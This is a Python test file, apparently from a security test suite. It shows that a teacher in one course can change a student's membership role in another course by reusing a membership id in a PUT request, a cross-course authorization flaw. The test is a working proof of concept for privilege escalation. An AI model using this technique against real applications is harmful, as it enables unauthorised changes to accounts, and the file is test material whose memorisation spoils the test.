
from helpers import login, logout, register, create_course, add_member, get_user_id, get_membership_id, get_row

def test_exploit_teacher_in_one_course_can_modify_membership_in_another_course(client, app_instance):
    session, base_url = client
    db_path = app_instance["db_path"]

    assert login(session, base_url, "admin", "admin123").status_code == 200

    assert register(session, base_url, "teacher_a", "pass123", "Teacher A").status_code == 200
    logout(session, base_url)
    assert login(session, base_url, "admin", "admin123").status_code == 200

    course_a = create_course(session, base_url, "Course A", "A").json()["course"]
    course_b = create_course(session, base_url, "Course B", "B").json()["course"]

    teacher_id = get_user_id(db_path, "teacher_a")
    assert add_member(session, base_url, course_a["course_id"], teacher_id, "teacher").status_code == 200

    assert register(session, base_url, "student_b", "pass123", "Student B").status_code == 200
    logout(session, base_url)
    assert login(session, base_url, "admin", "admin123").status_code == 200
    student_id = get_user_id(db_path, "student_b")
    assert add_member(session, base_url, course_b["course_id"], student_id, "student").status_code == 200
    membership_b = get_membership_id(db_path, course_b["course_id"], student_id)
    assert membership_b is not None

    logout(session, base_url)
    assert login(session, base_url, "teacher_a", "pass123").status_code == 200

    r = session.put(
        f"{base_url}/api/courses/{course_a['course_id']}/members/{membership_b}",
        json={"role_in_course": "teacher"},
        timeout=5,
    )
    assert r.status_code == 200, r.text

    changed = get_row(
        db_path,
        "SELECT role_in_course, course_id FROM memberships WHERE membership_id=?",
        (membership_b,),
    )
    assert changed["course_id"] == course_b["course_id"]
    assert changed["role_in_course"] == "teacher"
